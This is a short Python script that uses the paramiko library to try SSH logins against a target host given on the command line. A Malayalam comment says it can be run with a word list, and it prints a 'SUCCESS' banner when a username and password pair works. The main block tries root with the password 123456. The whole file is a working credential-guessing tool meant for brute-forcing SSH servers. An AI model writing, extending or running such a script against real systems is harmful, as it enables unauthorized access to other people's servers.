import paramiko, sys

def ssh_connect(target, user, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(target, username=user, password=password, timeout=5)
        print(f"[🔥] SUCCESS: {user}:{password} is VALID!")
        client.close()
        return True
    except:
        return False

# ലോജിക്: ഒരു വേർഡ് ലിസ്റ്റ് ഉപയോഗിച്ച് ഇത് റൺ ചെയ്യാം
if __name__ == "__main__":
    if len(sys.argv) > 1:
        ssh_connect(sys.argv[1], "root", "123456") # Example test
